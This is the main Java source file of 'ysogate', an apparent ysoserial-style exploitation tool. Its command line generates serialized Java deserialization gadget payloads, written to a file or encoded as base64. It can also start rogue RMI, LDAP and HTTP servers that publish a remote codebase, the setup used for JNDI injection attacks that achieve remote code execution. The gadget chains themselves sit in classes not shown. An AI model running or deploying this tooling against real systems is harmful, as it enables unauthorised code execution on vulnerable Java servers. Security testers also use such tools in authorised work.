package com.h2tg.ysogate;

import java.io.FileOutputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.util.*;
import com.h2tg.ysogate.config.Config;
import com.h2tg.ysogate.config.JndiConfig;
import com.h2tg.ysogate.exploit.server.LDAPServer;
import com.h2tg.ysogate.exploit.server.RMIServer;
import com.h2tg.ysogate.exploit.server.WebServer;
import org.apache.commons.cli.*;
import com.h2tg.ysogate.payloads.ObjectPayload;
import com.h2tg.ysogate.payloads.ObjectPayload.Utils;
import org.apache.commons.codec.binary.Base64OutputStream;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.annotation.Dependencies;

@SuppressWarnings("rawtypes")
public class Main {

    private static final String PREFIX = "\u001B[32m[root]#~\u001B[0m  ";
    private static final String ERR_PREFIX = "\u001B[31m[root]#~\u001B[0m  ";
    private static CommandLine cmdLine;
    public static Object PAYLOAD = null;
    private static Options commonOptions;
    private static Options payloadOptions;
    private static Options jndiOptions;

    public static void main(final String[] args) {
        initializeOptions();

        try {
            cmdLine = new DefaultParser().parse(commonOptions, args, true);

            if (cmdLine.hasOption("help") && !cmdLine.hasOption("mode")) {
                printUsage(null);
                return;
            }

            String mode = cmdLine.getOptionValue("mode");
            if (mode == null) {
                printUsage(null);
                throw new ParseException("Mode (-m) is required. Use 'payload' or 'jndi'.");
            }

            switch (mode.toLowerCase()) {
                case "payload":
                    handlePayloadMode(args);
                    break;
                case "jndi":
                    handleJNDIMode(args);
                    break;
                default:
                    printUsage(null);
                    throw new ParseException("Invalid mode. Use 'payload' or 'jndi'.");
            }
        } catch (ParseException e) {
            printError("Parameter input error: " + e.getMessage());
//            printUsage(null);
        }
    }

    private static void initializeOptions() {
        commonOptions = new Options()
                .addOption("m", "mode", true, "Operation mode: 'payload' or 'jndi'")
                .addOption("h", "help", false, "Show help message");

        payloadOptions = new Options()
                .addOption("g", "gadget", true, "Java deserialization gadget")
                .addOption("p", "parameters", true, "Gadget parameters")
                .addOption("f", "file", true, "Write Output into FileOutputStream (Specified FileName)")
                .addOption("b64", "base64", false, "Encode Output into base64");

        jndiOptions = new Options()
                .addOption("i", "ip", true, "IP address for JNDI server")
                .addOption("rp", "rmiPort", true, "RMI port")
                .addOption("lp", "ldapPort", true, "LDAP port")
                .addOption("hp", "httpPort", true, "HTTP port")
                .addOption("u", "url", true, "URL for JNDI resource");

        // Add common options to both payload and JNDI options
        for (Option opt : commonOptions.getOptions()) {
            payloadOptions.addOption(opt);
            jndiOptions.addOption(opt);
        }
    }

    private static void handlePayloadMode(String[] args) throws ParseException {
        cmdLine = new DefaultParser().parse(payloadOptions, args);

        if (cmdLine.hasOption("help")) {
            printUsage(payloadOptions);
            return;
        }

        if (!cmdLine.hasOption("gadget") || !cmdLine.hasOption("parameters")) {
            printUsage(payloadOptions);
            throw new ParseException("Payload mode requires -g and -p options.");
        }

        Config.WRITE_FILE = cmdLine.hasOption("file");
        Config.FILE = cmdLine.getOptionValue("file");
        Config.BASE64_ENCODE = cmdLine.hasOption("base64");

        generatePayload(cmdLine.getOptionValue("gadget"), cmdLine.getOptionValue("parameters"));
    }

    private static void handleJNDIMode(String[] args) throws ParseException {
        cmdLine = new DefaultParser().parse(jndiOptions, args);

        if (cmdLine.hasOption("help")) {
            printUsage(jndiOptions);
            return;
        }

//        String[] requiredOpts = {"ip"};
//        for (String opt : requiredOpts) {
//            if (!cmdLine.hasOption(opt)) {
//                printUsage(jndiOptions);
//                throw new ParseException("JNDI mode requires -i options.");
//            }
//        }

        printInfo("Starting JNDI server...");
        // TODO: Implement JNDI server startup logic
        String ip = cmdLine.getOptionValue("ip") == null ? JndiConfig.ip : cmdLine.getOptionValue("ip");
        int rmiPort = cmdLine.getOptionValue("rp") == null ? JndiConfig.rmiPort : Integer.parseInt(cmdLine.getOptionValue("rp"));
        int ldapPort = cmdLine.getOptionValue("lp") == null ? JndiConfig.ldapPort : Integer.parseInt(cmdLine.getOptionValue("lp"));
        int httpPort = cmdLine.getOptionValue("hp") == null ? JndiConfig.httpPort : Integer.parseInt(cmdLine.getOptionValue("hp"));
        JndiConfig.codebase = "http://" + ip + ":" + httpPort + "/";

//        printInfo("JNDI Server IP: " + ip);
//        printInfo("RMI Port: " + rmiPort);
//        printInfo("LDAP Port: " + ldapPort);
//        printInfo("HTTP Port: " + httpPort);

        RMIServer rmiServer = new RMIServer(ip, rmiPort);
        LDAPServer ldapServer = new LDAPServer(ip, ldapPort);
        WebServer webServer = new WebServer(ip, httpPort);

        Thread rmiThread = new Thread(rmiServer);
        Thread ldapThread = new Thread(ldapServer);
        Thread webThread = new Thread(webServer);

        rmiThread.start();
        ldapThread.start();
        webThread.start();
    }

    private static void generatePayload(String payloadType, String parameters) {
        try {
            final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
            if (payloadClass == null) {
                throw new IllegalArgumentException("Invalid payload type '" + payloadType + "'");
            }

            ObjectPayload payload = payloadClass.newInstance();
            Object object = payload.getObject(parameters);

            PAYLOAD = object;
            if (Strings.isFromExploit()) {
                return;
            }

            try (OutputStream out = getOutputStream()) {
                Serializer.serialize(object, out);
                ObjectPayload.Utils.releasePayload(payload, object);
            }
        } catch (Exception e) {
            printError("Error while generating or serializing payload: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private static OutputStream getOutputStream() throws Exception {
        if (Config.WRITE_FILE) {
            return new FileOutputStream(Config.FILE);
        } else if (Config.BASE64_ENCODE) {
            return new Base64OutputStream(System.out, true, -1, null);
        } else {
            return System.out;
        }
    }

    private static void printUsage(Options options) {
        HelpFormatter formatter = new HelpFormatter();
        formatter.setWidth(100);

        printInfo("H4cking to the Gate !");
        printInfo("Usage:");
        printInfo("Payload Mode: java -jar ysogate-[version]-all.jar -m payload [PAYLOAD OPTIONS]");
        printInfo("JNDI Mode:    java -jar ysogate-[version]-all.jar -m jndi [JNDI OPTIONS]");
        System.out.println();

        if (options == null) {
            printInfo("Common Options:");
            formatter.printOptions(new PrintWriter(System.out, true), formatter.getWidth(), commonOptions,
                    formatter.getLeftPadding(), formatter.getDescPadding());
            printInfo("For mode-specific options, please specify a mode (-m payload or -m jndi) and use -h");
        } else if (options == payloadOptions) {
            printInfo("Payload Mode Options:");
            formatter.printOptions(new PrintWriter(System.out, true), formatter.getWidth(), payloadOptions,
                    formatter.getLeftPadding(), formatter.getDescPadding());
            showPayloads();
        } else if (options == jndiOptions) {
            printInfo("JNDI Mode Options:");
            formatter.printOptions(new PrintWriter(System.out, true), formatter.getWidth(), jndiOptions,
                    formatter.getLeftPadding(), formatter.getDescPadding());
        }
    }

    public static void printInfo(String message) {
        System.out.println(PREFIX + message);
    }

    private static void printError(String message) {
        System.err.println(ERR_PREFIX + "Error: " + message);
    }

    private static void showPayloads() {
        System.out.println("\r\n");
        System.out.println(PREFIX + "Available payload types:");
        final List<Class<? extends ObjectPayload>> payloadClasses = new ArrayList<>(ObjectPayload.Utils.getPayloadClasses());
        Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<>();
        rows.add(new String[]{"Payload", "Authors", "Dependencies"});
        rows.add(new String[]{"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
            rows.add(new String[]{
                    payloadClass.getSimpleName(),
                    Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                    Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.out.println("     " + line);
        }

        System.err.println("\r\n");
    }
}